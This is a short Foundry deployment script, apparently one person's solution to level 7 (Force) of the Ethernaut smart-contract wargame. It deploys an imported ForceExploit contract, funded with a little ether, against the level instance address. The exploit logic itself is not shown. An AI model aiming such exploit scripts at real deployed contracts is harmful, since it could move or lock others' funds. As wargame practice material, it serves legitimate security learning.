// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ForceExploit} from "src/07/ForceExploit.sol";


contract Exploit is Script {

    ForceExploit exploit;
    address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));     
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY")); 
    uint256 immutable initialDeposit = 0.0005 ether;  
        
    function run() external {
        vm.startBroadcast(hacker);
        exploit = new ForceExploit{value: initialDeposit}(instance);
        vm.stopBroadcast();
    }
}